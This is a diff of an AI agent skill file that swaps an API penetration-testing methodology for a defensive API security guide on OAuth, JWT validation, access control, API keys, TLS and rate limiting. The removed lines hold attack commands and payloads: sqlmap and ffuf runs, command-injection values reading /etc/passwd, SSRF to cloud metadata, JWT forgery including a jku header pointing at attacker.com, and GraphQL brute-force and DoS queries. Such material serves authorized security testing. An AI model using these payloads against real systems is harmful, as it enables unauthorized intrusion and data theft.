@@ -1,647 +1,519 @@
 ---
 name: api-security
-description: "Comprehensive API security testing skill for REST, GraphQL, gRPC, and WebSocket APIs. This skill should be used when performing API penetration testing, testing for OWASP API Top 10 vulnerabilities, fuzzing API endpoints, testing authentication/authorization, and analyzing API specifications. Triggers on requests to test API security, pentest REST APIs, test GraphQL endpoints, analyze OpenAPI/Swagger specs, or find API vulnerabilities."
+description: Use when implementing API authentication, authorization, or security patterns. Covers OAuth 2.0, OIDC, JWT, API keys, rate limiting, and common API security vulnerabilities.
+allowed-tools: Read, Glob, Grep
 ---
 
-# API Security Testing
+# API Security
 
-This skill enables comprehensive security testing of APIs including REST, GraphQL, gRPC, and WebSocket protocols. It covers the OWASP API Security Top 10 and provides practical testing methodologies for common API vulnerabilities.
+Comprehensive guide to securing APIs - authentication, authorization, and protection against common vulnerabilities.
 
 ## When to Use This Skill
 
-This skill should be invoked when:
-- Performing API penetration testing
-- Testing for OWASP API Security Top 10 vulnerabilities
-- Fuzzing REST/GraphQL/gRPC endpoints
-- Testing API authentication and authorization (BOLA/BFLA)
-- Analyzing OpenAPI/Swagger specifications
-- Testing JWT/OAuth implementations
-- Rate limiting and resource exhaustion testing
+- Implementing API authentication (OAuth, OIDC, JWT)
+- Designing authorization models for APIs
+- Securing API endpoints
+- Understanding API security vulnerabilities
+- Implementing rate limiting and abuse prevention
+- API key management
 
-### Trigger Phrases
-- "test this API for security issues"
-- "pentest the REST API"
-- "test GraphQL security"
-- "check for BOLA/IDOR vulnerabilities"
-- "analyze OpenAPI spec for security"
-- "test API authentication"
-- "fuzz API endpoints"
+## Authentication Patterns
 
----
+### OAuth 2.0 Flows
 
-## Prerequisites
+```text
+OAuth 2.0 Grant Types:
 
-### Required Tools
+1. Authorization Code (with PKCE)
+   └── Best for: Web apps, mobile apps, SPAs
+   └── Most secure for user authentication
 
-| Tool | Purpose | Installation |
-|------|---------|--------------|
-| Burp Suite | HTTP interception/testing | PortSwigger download |
-| Postman | API testing/automation | postman.com |
-| ffuf | API fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
-| nuclei | Vulnerability scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
-| jwt_tool | JWT analysis | `pip install jwt_tool` |
-| graphql-cop | GraphQL scanning | `pip install graphql-cop` |
-| arjun | Parameter discovery | `pip install arjun` |
-| kiterunner | API endpoint discovery | GitHub release |
+   User ──► Auth Server ──► Authorization Code ──► Token
 
----
+2. Client Credentials
+   └── Best for: Service-to-service (M2M)
+   └── No user context, server-to-server
 
-## OWASP API Security Top 10 (2023)
+   Service ──► Auth Server ──► Access Token
 
-### Priority Testing Matrix
+3. Device Authorization (Device Flow)
+   └── Best for: Smart TVs, IoT, limited input devices
+   └── User authorizes on separate device
 
-| Rank | Vulnerability | Impact | Detection |
-|------|--------------|--------|-----------|
-| API1 | Broken Object Level Authorization (BOLA) | Critical | Manual + Automated |
-| API2 | Broken Authentication | Critical | Manual + Tools |
-| API3 | Broken Object Property Level Authorization | High | Manual |
-| API4 | Unrestricted Resource Consumption | High | Automated |
-| API5 | Broken Function Level Authorization (BFLA) | High | Manual |
-| API6 | Unrestricted Access to Sensitive Business Flows | High | Manual |
-| API7 | Server Side Request Forgery (SSRF) | High | Manual + Automated |
-| API8 | Security Misconfiguration | Medium | Automated |
-| API9 | Improper Inventory Management | Medium | Discovery |
-| API10 | Unsafe Consumption of APIs | Medium | Code Review |
+   Device ──► Show Code ──► User enters on phone ──► Token
 
----
-
-## REST API Testing
-
-### Phase 1: Reconnaissance
-
-```bash
-# Discover API endpoints from documentation
-curl -s https://target.com/api/docs | jq
-curl -s https://target.com/swagger.json
-curl -s https://target.com/openapi.json
-curl -s https://target.com/.well-known/openapi.json
-
-# Fuzz for common API paths
-ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,401,403
-
-# Common API paths to check
-/api/
-/api/v1/
-/api/v2/
-/rest/
-/graphql
-/graphiql
-/api-docs
-/swagger
-/swagger-ui
-/swagger.json
-/openapi.json
-/.well-known/
-
-# Discover parameters
-arjun -u https://target.com/api/users -m GET POST
+Deprecated (avoid):
+- Implicit flow (security issues)
+- Resource Owner Password Credentials (anti-pattern)
 ```
 
-### Phase 2: Authentication Testing
+### Authorization Code Flow with PKCE
 
-```bash
-# JWT Analysis
-jwt_tool <token> -T  # Tampering tests
-jwt_tool <token> -X a  # Algorithm none attack
-jwt_tool <token> -X k  # Key confusion RS256->HS256
-jwt_tool <token> -C -d /path/to/wordlist  # Crack weak secret
+```text
+┌──────────┐                              ┌───────────────┐
+│  Client  │                              │  Auth Server  │
+└────┬─────┘                              └───────┬───────┘
+     │                                            │
+     │  1. Generate code_verifier (random)        │
+     │  2. Compute code_challenge = SHA256(verifier)
+     │                                            │
+     │──3. Authorization Request ───────────────►│
+     │     (client_id, redirect_uri,             │
+     │      code_challenge, challenge_method)     │
+     │                                            │
+     │◄──4. Authorization Code ──────────────────│
+     │     (after user authentication/consent)    │
+     │                                            │
+     │──5. Token Request ───────────────────────►│
+     │     (code, code_verifier)                 │
+     │                                            │
+     │◄──6. Access Token + Refresh Token ────────│
+     │                                            │
 
-# OAuth Testing
-# 1. Check for open redirect in redirect_uri
-# 2. Test state parameter validation
-# 3. Test PKCE enforcement
-# 4. Check token leakage in referrer
-
-# API Key Testing
-# 1. Check if key in URL (leaks in logs)
-# 2. Test key rotation
-# 3. Check key scoping
-# 4. Test revoked key handling
+Why PKCE?
+- Prevents authorization code interception attacks
+- Required for mobile apps and SPAs
+- Recommended for all OAuth flows
 ```
 
-### Phase 3: Authorization Testing (BOLA/BFLA)
+### OpenID Connect (OIDC)
 
-```markdown
-## BOLA (Broken Object Level Authorization) Testing
+```text
+OIDC = OAuth 2.0 + Identity Layer
 
-1. Identify endpoints with object IDs:
-   GET /api/users/{id}
-   GET /api/orders/{id}
-   PUT /api/documents/{id}
+OIDC adds:
+├── ID Token (JWT with user claims)
+├── UserInfo endpoint
+├── Standardized claims (sub, name, email, etc.)
+└── Discovery and metadata
 
-2. Create two test accounts (User A, User B)
-
-3. As User A, access own resource:
-   GET /api/users/123 -> 200 OK
-
-4. As User A, try accessing User B's resource:
-   GET /api/users/456 -> Should be 403, not 200
-
-5. Test ID types:
-   - Sequential integers: 1, 2, 3...
-   - UUIDs: May seem random but test anyway
-   - Encoded IDs: Base64, hex
-   - Timestamps: Predictable patterns
-
-## BFLA (Broken Function Level Authorization) Testing
-
-1. Identify privileged endpoints:
-   POST /api/admin/users
-   DELETE /api/admin/config
-   PUT /api/settings/global
-
-2. As regular user, attempt admin actions
-
-3. Test HTTP method switching:
-   GET /api/users (allowed) -> POST /api/users (should check auth)
-
-4. Test parameter pollution:
-   GET /api/users?role=user -> GET /api/users?role=admin
+Token Types:
+┌─────────────────────────────────────────────────┐
+│ ID Token                                        │
+│ - User identity (who they are)                  │
+│ - Contains claims about authentication          │
+│ - For the CLIENT to consume                     │
+├─────────────────────────────────────────────────┤
+│ Access Token                                    │
+│ - Authorization (what they can do)              │
+│ - For the API/resource server to validate       │
+│ - Should NOT be parsed by client                │
+├─────────────────────────────────────────────────┤
+│ Refresh Token                                   │
+│ - Long-lived credential                         │
+│ - Used to obtain new access tokens              │
+│ - Store securely, never expose to browser       │
+└─────────────────────────────────────────────────┘
 ```
 
-### Phase 4: Input Validation Testing
+### JWT (JSON Web Tokens)
 
-```bash
-# SQL Injection
-sqlmap -u "https://target.com/api/users?id=1" --batch --dbs
-sqlmap -r request.txt --batch --level 5 --risk 3
+```text
+JWT Structure:
 
-# NoSQL Injection payloads
-{"username": {"$ne": ""}, "password": {"$ne": ""}}
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
+Header.Payload.Signature
 
-# Command Injection in API parameters
-{"cmd": "; ls -la"}
-{"file": "test.txt; cat /etc/passwd"}
-{"host": "localhost; whoami"}
-
-# SSRF payloads
-{"url": "http://169.254.169.254/latest/meta-data/"}
-{"webhook": "http://internal-service:8080/admin"}
-{"avatar": "http://localhost:22"}
-```
-
-### Phase 5: Rate Limiting & Resource Testing
-
-```bash
-# Test rate limiting
-for i in {1..1000}; do
-  curl -s -o /dev/null -w "%{http_code}\n" \
-    "https://target.com/api/login" \
-    -d '{"user":"test","pass":"test"}'
-done | sort | uniq -c
-
-# Test pagination abuse
-GET /api/users?limit=1000000
-GET /api/users?page=-1
-GET /api/users?offset=999999999
-
-# Test field expansion
-GET /api/users?expand=all
-GET /api/users?fields=password,secret
-
-# Test batch operations
-POST /api/batch [array of 10000 requests]
-```
-
----
-
-## GraphQL Security Testing
-
-### Discovery
-
-```bash
-# Common GraphQL endpoints
-/graphql
-/graphiql
-/graphql/console
-/graphql-explorer
-/v1/graphql
-
-# Introspection query (if enabled)
-curl -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
-
-# Using graphql-cop for scanning
-graphql-cop -t https://target.com/graphql
-```
-
-### GraphQL-Specific Attacks
-
-```graphql
-# Introspection Query (full schema)
+Header (Base64URL):
 {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    types {
-      name
-      fields {
-        name
-        args { name type { name } }
-        type { name }
-      }
-    }
-  }
+  "alg": "RS256",     // Algorithm
+  "typ": "JWT",       // Type
+  "kid": "key-123"    // Key ID for rotation
 }
 
-# Batching Attack (bypass rate limits)
-[
-  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
-]
-
-# Alias-based DoS
+Payload (Base64URL):
 {
-  a1: users { id name }
-  a2: users { id name }
-  a3: users { id name }
-  # ... repeat many times
+  "iss": "https://auth.example.com",  // Issuer
+  "sub": "user-12345",                 // Subject
+  "aud": "https://api.example.com",   // Audience
+  "exp": 1735689600,                   // Expiration
+  "iat": 1735686000,                   // Issued at
+  "scope": "read write"                // Scopes/permissions
 }
 
-# Deep Query DoS
+Signature:
+RSASHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  privateKey
+)
+```
+
+### JWT Validation
+
+```text
+JWT Validation Checklist:
+
+1. Signature Verification
+   □ Verify using correct public key (from JWKS)
+   □ Reject if signature invalid
+
+2. Claims Validation
+   □ iss (issuer): Matches expected issuer
+   □ aud (audience): Contains your API identifier
+   □ exp (expiration): Token not expired
+   □ iat (issued at): Not issued in the future
+   □ nbf (not before): Token is active
+
+3. Additional Checks
+   □ Token not in revocation list (if applicable)
+   □ Required scopes present
+   □ Token type is access_token (not id_token)
+
+Common Mistakes:
+❌ Trusting "alg": "none"
+❌ Not validating audience
+❌ Using symmetric keys for public APIs
+❌ Storing sensitive data in JWT payload
+```
+
+## Authorization Patterns
+
+### Role-Based Access Control (RBAC)
+
+```text
+RBAC Model:
+
+Users ──► Roles ──► Permissions
+
+Example:
+┌──────────────────────────────────────┐
+│ Role: editor                         │
+├──────────────────────────────────────┤
+│ Permissions:                         │
+│ - articles:read                      │
+│ - articles:create                    │
+│ - articles:update                    │
+│ - comments:moderate                  │
+└──────────────────────────────────────┘
+
+API Implementation:
+GET /articles        ← Requires: articles:read
+POST /articles       ← Requires: articles:create
+PUT /articles/{id}   ← Requires: articles:update
+DELETE /articles/{id} ← Requires: articles:delete
+
+Token includes:
 {
-  users {
-    friends {
-      friends {
-        friends {
-          friends { name }
-        }
-      }
-    }
-  }
-}
-
-# Directive Overloading
-query @skip(if: false) @skip(if: false) @skip(if: false) {
-  users { id }
-}
-
-# Field Suggestion Exploit
-{
-  user {
-    passwor  # Typo may reveal field exists via suggestions
-  }
+  "scope": "articles:read articles:create articles:update"
 }
 ```
 
-### BOLA in GraphQL
+### Attribute-Based Access Control (ABAC)
 
-```graphql
-# Test object-level authorization
-query {
-  user(id: "other-user-id") {
-    email
-    ssn
-    creditCard
-  }
-}
+```text
+ABAC Model:
 
-# Nested BOLA
-query {
-  organization(id: "my-org") {
-    users {
-      # Can I see users from other orgs?
-      id email
-    }
-  }
-}
+Access = f(Subject, Resource, Action, Environment)
 
-# Mutation BOLA
-mutation {
-  updateUser(id: "other-user-id", input: { role: "admin" }) {
-    id role
-  }
-}
+Subject Attributes:
+- Role, department, clearance level
+- User ID, group membership
+
+Resource Attributes:
+- Owner, classification, type
+- Created date, sensitivity
+
+Action Attributes:
+- Read, write, delete, approve
+
+Environment Attributes:
+- Time of day, IP address, device type
+
+Example Policy:
+"Allow if user.department == resource.department
+ AND user.role == 'manager'
+ AND action == 'approve'
+ AND environment.time.isBusinessHours"
 ```
 
----
+### Resource-Based Authorization
 
-## gRPC Security Testing
+```text
+Check ownership/access at resource level:
 
-### Setup
+GET /documents/{id}
 
-```bash
-# Install grpcurl
-go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+Authorization Check:
+1. Validate token (authentication)
+2. Extract user from token
+3. Query: Can this user access this document?
+   - Is user the owner?
+   - Does user have explicit permission?
+   - Is document in a shared folder user can access?
+   - Is user in a group with access?
+4. Return 403 if not authorized
 
-# List services (requires reflection)
-grpcurl -plaintext localhost:50051 list
+Implementation Pattern:
+async function authorize(userId, resourceId, action) {
+  // Check direct ownership
+  if (await isOwner(userId, resourceId)) return true;
 
-# Describe service
-grpcurl -plaintext localhost:50051 describe UserService
+  // Check explicit permissions
+  if (await hasPermission(userId, resourceId, action)) return true;
 
-# Call method
-grpcurl -plaintext -d '{"id": "123"}' localhost:50051 UserService/GetUser
-```
+  // Check group permissions
+  if (await hasGroupPermission(userId, resourceId, action)) return true;
 
-### gRPC Testing Areas
-
-```markdown
-1. **Authentication**
-   - Test metadata/header authentication
-   - Check certificate validation (mTLS)
-   - Test token handling
-
-2. **Authorization**
-   - BOLA on resource IDs
-   - Method-level access control
-   - Role-based restrictions
-
-3. **Input Validation**
-   - Protobuf field validation
-   - Type confusion
-   - Large message DoS
-
-4. **Reflection**
-   - Disable in production
-   - Information disclosure via describe
-
-5. **TLS Configuration**
-   - Verify TLS is enforced
-   - Check certificate pinning
-   - Test cipher suites
-```
-
----
-
-## WebSocket Security Testing
-
-### Discovery & Connection
-
-```javascript
-// Connect to WebSocket
-const ws = new WebSocket('wss://target.com/ws');
-
-ws.onopen = () => {
-  console.log('Connected');
-  ws.send(JSON.stringify({action: 'subscribe', channel: 'updates'}));
-};
-
-ws.onmessage = (event) => {
-  console.log('Received:', event.data);
-};
-```
-
-### WebSocket Attacks
-
-```markdown
-1. **Cross-Site WebSocket Hijacking (CSWSH)**
-   - Check Origin header validation
-   - Test from different domains
-
-2. **Authorization**
-   - Subscribe to unauthorized channels
-   - Send actions without auth
-   - Test BOLA on message IDs
-
-3. **Injection**
-   - SQL injection in messages
-   - XSS in reflected content
-   - Command injection
-
-4. **DoS**
-   - Message flooding
-   - Large message size
-   - Connection exhaustion
-```
-
----
-
-## JWT Security Testing
-
-### Common JWT Attacks
-
-```bash
-# Decode JWT
-echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
-
-# Algorithm None Attack
-# Change header to: {"alg": "none", "typ": "JWT"}
-# Remove signature
-
-# Key Confusion (RS256 to HS256)
-# If server uses RS256, try signing with HS256 using public key
-
-# Weak Secret Cracking
-jwt_tool $JWT -C -d /path/to/wordlist.txt
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt
-
-# Kid Header Injection
-{"alg": "HS256", "typ": "JWT", "kid": "../../dev/null"}
-{"alg": "HS256", "typ": "JWT", "kid": "key' UNION SELECT 'secret'--"}
-
-# JKU/X5U Header Injection
-{"alg": "RS256", "jku": "https://attacker.com/jwks.json"}
-# Host malicious JWKS with your keys
-
-# Expiration Bypass
-# Modify exp claim to future date
-# Test with expired tokens
-```
-
-### JWT Checklist
-
-```markdown
-- [ ] Algorithm none vulnerability
-- [ ] Key confusion (RS256 -> HS256)
-- [ ] Weak HMAC secret
-- [ ] Kid header injection (SQLi, path traversal)
-- [ ] JKU/X5U URL injection
-- [ ] Token expiration not validated
-- [ ] Token not invalidated on logout
-- [ ] Sensitive data in payload
-- [ ] Token reuse after password change
-```
-
----
-
-## API Fuzzing
-
-### Parameter Fuzzing
-
-```bash
-# Fuzz parameter values
-ffuf -u "https://target.com/api/users?id=FUZZ" \
-  -w numbers.txt \
-  -H "Authorization: Bearer $TOKEN" \
-  -mc 200
-
-# Fuzz JSON body
-ffuf -u "https://target.com/api/users" \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"role": "FUZZ"}' \
-  -w roles.txt
-
-# Parameter pollution
-GET /api/users?id=1&id=2&id=admin
-
-# Mass assignment
-POST /api/users
-{"name": "test", "role": "admin", "isAdmin": true}
-```
-
-### Endpoint Fuzzing
-
-```bash
-# API endpoint discovery
-ffuf -u "https://target.com/api/FUZZ" \
-  -w api-endpoints.txt \
-  -mc 200,201,204,301,302,401,403
-
-# Version fuzzing
-ffuf -u "https://target.com/api/FUZZ/users" \
-  -w versions.txt  # v1, v2, v3, beta, internal
-
-# HTTP method fuzzing
-for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
-  curl -X $method https://target.com/api/admin -v
-done
-```
-
----
-
-## Nuclei API Templates
-
-```bash
-# Scan with API-specific templates
-nuclei -u https://target.com/api -t exposures/
-nuclei -u https://target.com/api -t vulnerabilities/
-nuclei -u https://target.com/api -t misconfiguration/
-
-# Scan from OpenAPI spec
-nuclei -l endpoints.txt -t api-tests/
-
-# Custom API template
-echo 'id: custom-api-test
-info:
-  name: Custom API Test
-  severity: high
-requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/api/admin"
-    matchers:
-      - type: status
-        status:
-          - 200' > custom.yaml
-
-nuclei -u https://target.com -t custom.yaml
-```
-
----
-
-## Common Findings Template
-
-### BOLA Finding
-
-```markdown
-## [CRITICAL] Broken Object Level Authorization (BOLA)
-
-**Endpoint**: GET /api/v1/users/{id}
-**OWASP API**: API1:2023
-
-### Description
-The API endpoint allows authenticated users to access other users' data by manipulating the ID parameter without proper authorization checks.
-
-### Evidence
-Request as User A (ID: 123):
-```
-GET /api/v1/users/456 HTTP/1.1
-Authorization: Bearer <user_a_token>
-```
-
-Response:
-```json
-{
-  "id": 456,
-  "email": "userb@example.com",
-  "ssn": "XXX-XX-XXXX"
+  return false;
 }
 ```
 
-### Impact
-- Access to all user data
-- Privacy violation
-- Potential for data theft
+## API Key Security
 
-### Remediation
-- Implement object-level authorization checks
-- Verify requesting user owns or has access to requested resource
-- Use indirect references or verify ownership
+### API Key Best Practices
 
-### References
-- https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
+```text
+API Key Design:
+
+Format: prefix_randomBytes
+Example: sk_live_a1b2c3d4e5f6...
+
+Prefix Benefits:
+- sk_ = secret key (server-side only)
+- pk_ = public key (can be exposed)
+- test_ = test environment
+- live_ = production
+
+Security Requirements:
+□ Sufficient entropy (32+ bytes random)
+□ Secure storage (hashed, not plaintext)
+□ Scoped permissions (not all-or-nothing)
+□ Rotation capability
+□ Audit logging
+□ Rate limiting per key
 ```
 
----
+### API Key vs OAuth
 
-## Reporting Checklist
+```text
+When to Use Each:
 
-```markdown
-### API Security Assessment Checklist
+API Keys:
+✓ Service-to-service integration
+✓ Simple use cases
+✓ Developer-facing APIs
+✓ Stateless, simple auth
+✗ Not for user context
+✗ Hard to revoke in real-time
 
-**Authentication**
-- [ ] Authentication mechanism identified
-- [ ] Token/session security tested
-- [ ] Brute force protection tested
-- [ ] Password policies verified
-
-**Authorization**
-- [ ] BOLA tested on all endpoints with IDs
-- [ ] BFLA tested (privilege escalation)
-- [ ] Role-based access verified
-- [ ] Horizontal privilege escalation tested
-
-**Input Validation**
-- [ ] SQL injection tested
-- [ ] NoSQL injection tested
-- [ ] Command injection tested
-- [ ] XXE tested (if XML accepted)
-- [ ] SSRF tested on URL parameters
-
-**Rate Limiting**
-- [ ] Rate limiting present
-- [ ] Bypass techniques tested
-- [ ] Resource exhaustion tested
-
-**Information Disclosure**
-- [ ] Verbose errors disabled
-- [ ] Stack traces hidden
-- [ ] Internal IPs not leaked
-- [ ] API versioning secure
-
-**Configuration**
-- [ ] HTTPS enforced
-- [ ] CORS properly configured
-- [ ] Security headers present
-- [ ] Debug endpoints disabled
+OAuth 2.0:
+✓ User-delegated access
+✓ Fine-grained scopes
+✓ Short-lived tokens
+✓ Revocation support
+✓ Standard compliance
+✗ More complex to implement
+✗ Requires authorization server
 ```
 
----
+## Common Vulnerabilities
 
-## Bundled Resources
+### OWASP API Security Top 10
 
-### scripts/
-- `bola_scanner.py` - Automated BOLA testing
-- `jwt_analyzer.py` - JWT security analysis
-- `graphql_introspection.py` - GraphQL schema extraction
-- `api_fuzzer.py` - Parameter and endpoint fuzzing
-- `openapi_parser.py` - OpenAPI spec security analysis
-- `rate_limit_tester.py` - Rate limiting bypass testing
+```text
+1. Broken Object Level Authorization (BOLA)
+   Problem: Accessing other users' resources by changing IDs
+   Fix: Always verify user has access to specific resource
 
-### references/
-- `owasp_api_top10.md` - OWASP API Security Top 10 details
-- `jwt_attacks.md` - Comprehensive JWT attack guide
-- `graphql_security.md` - GraphQL security testing guide
-- `rest_testing.md` - REST API testing methodology
+   ❌ GET /users/123/orders (any user can change 123)
+   ✓ Verify requesting user can access user 123's orders
 
-### payloads/
-- `sqli_api.txt` - SQL injection payloads for APIs
-- `nosql_injection.txt` - NoSQL injection payloads
-- `ssrf_payloads.txt` - SSRF test URLs
-- `bola_ids.txt` - Common ID patterns for BOLA testing
+2. Broken Authentication
+   Problem: Weak authentication mechanisms
+   Fix: Use proven auth protocols, implement properly
+
+   ❌ Custom token schemes, weak passwords
+   ✓ OAuth 2.0/OIDC with MFA
+
+3. Broken Object Property Level Authorization
+   Problem: Exposing sensitive properties
+   Fix: Filter response based on authorization
+
+   ❌ Returning user.password_hash in API response
+   ✓ Explicitly select fields to return
+
+4. Unrestricted Resource Consumption
+   Problem: No limits on requests/data
+   Fix: Rate limiting, pagination, resource quotas
+
+   ❌ GET /users returns 10 million records
+   ✓ Pagination, query limits, rate limiting
+
+5. Broken Function Level Authorization
+   Problem: Missing authorization on endpoints
+   Fix: Verify authorization for every function
+
+   ❌ Admin endpoints accessible to regular users
+   ✓ Role checks on all endpoints
+
+6. Unrestricted Access to Sensitive Business Flows
+   Problem: Business logic abuse
+   Fix: Detect and limit abuse patterns
+
+   ❌ Unlimited password reset attempts
+   ✓ Rate limit + CAPTCHA on sensitive flows
+
+7. Server Side Request Forgery (SSRF)
+   Problem: API fetches attacker-controlled URLs
+   Fix: Validate and sanitize URLs, allowlist
+
+   ❌ POST /fetch { "url": "http://internal-service" }
+   ✓ Validate against allowlist, block internal IPs
+
+8. Security Misconfiguration
+   Problem: Default configs, exposed errors
+   Fix: Harden configuration, minimal errors
+
+   ❌ Detailed stack traces in production
+   ✓ Generic error messages, proper headers
+
+9. Improper Inventory Management
+   Problem: Untracked API versions, shadow APIs
+   Fix: API inventory, version management
+
+   ❌ Old API versions still accessible
+   ✓ Inventory, lifecycle management, deprecation
+
+10. Unsafe Consumption of APIs
+    Problem: Trusting third-party API responses
+    Fix: Validate all external data
+
+    ❌ Directly using third-party response data
+    ✓ Validate, sanitize, treat as untrusted
+```
+
+### Input Validation
+
+```text
+Validation Layers:
+
+1. Syntax Validation
+   - Is it valid JSON/XML?
+   - Are required fields present?
+   - Are field types correct?
+
+2. Semantic Validation
+   - Is email format valid?
+   - Is date in valid range?
+   - Does ID reference exist?
+
+3. Business Rule Validation
+   - Is quantity within limits?
+   - Is user authorized for this action?
+   - Does the state transition make sense?
+
+Validation Patterns:
+- Allowlist over blocklist
+- Validate on input AND output
+- Fail safely with clear errors
+- Log validation failures for monitoring
+```
+
+## Transport Security
+
+### TLS Requirements
+
+```text
+TLS Configuration:
+
+Minimum: TLS 1.2
+Preferred: TLS 1.3
+
+Required Settings:
+□ Strong cipher suites only
+□ Perfect forward secrecy (ECDHE)
+□ Valid certificates from trusted CA
+□ HSTS header enabled
+□ Certificate transparency
+
+Headers:
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+```
+
+### Certificate Pinning
+
+```text
+Certificate Pinning (Mobile/Embedded):
+
+Purpose: Prevent MITM attacks even with compromised CAs
+
+Options:
+1. Pin certificate
+   - Requires update for certificate rotation
+
+2. Pin public key
+   - Survives certificate renewal
+   - More flexible
+
+3. Pin intermediate CA
+   - Balance of security and flexibility
+
+Considerations:
+- Always have backup pins
+- Plan for rotation
+- Handle failures gracefully
+- Consider using dynamic pinning
+```
+
+## Rate Limiting and Abuse Prevention
+
+```text
+Rate Limiting Strategies:
+
+By Identity:
+- Per API key
+- Per user ID
+- Per client ID
+
+By Resource:
+- Per endpoint
+- Per operation type
+- Per resource ID
+
+Headers (draft standard):
+RateLimit-Limit: 100
+RateLimit-Remaining: 95
+RateLimit-Reset: 1735689600
+Retry-After: 60
+
+Response Codes:
+429 Too Many Requests - Rate limit exceeded
+503 Service Unavailable - Server overloaded
+
+Abuse Prevention:
+□ Rate limiting
+□ Request size limits
+□ CAPTCHA for sensitive operations
+□ Behavioral analysis
+□ IP reputation
+□ Anomaly detection
+```
+
+## Security Headers
+
+```text
+Essential API Security Headers:
+
+# Prevent MIME type sniffing
+X-Content-Type-Options: nosniff
+
+# Control caching of sensitive data
+Cache-Control: no-store, private
+
+# CORS configuration (be restrictive)
+Access-Control-Allow-Origin: https://trusted.example.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Authorization, Content-Type
+
+# Frame protection (if serving HTML)
+X-Frame-Options: DENY
+
+# Content Security Policy (if serving HTML)
+Content-Security-Policy: default-src 'none'
+```
+
+## Related Skills
+
+- `zero-trust-architecture` - Overall security architecture
+- `mtls-service-mesh` - Service-to-service security
+- `rate-limiting-patterns` - Detailed rate limiting strategies
+- `secrets-management` - Managing API keys and secrets
